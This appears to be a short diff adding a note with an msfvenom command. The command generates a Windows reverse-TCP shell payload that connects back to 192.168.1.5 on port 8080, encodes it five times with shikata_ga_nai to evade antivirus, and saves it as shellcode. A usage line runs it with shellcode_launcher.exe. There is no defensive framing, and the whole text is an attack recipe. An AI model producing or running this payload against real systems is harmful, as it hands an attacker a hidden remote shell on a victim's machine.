@@ -1,0 +1,3 @@
+msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.5 lport=8080 -e x86/shikata_ga_nai -i 5 -f raw > test.c
+
+#usage:shellcode_launcher.exe -i t.c
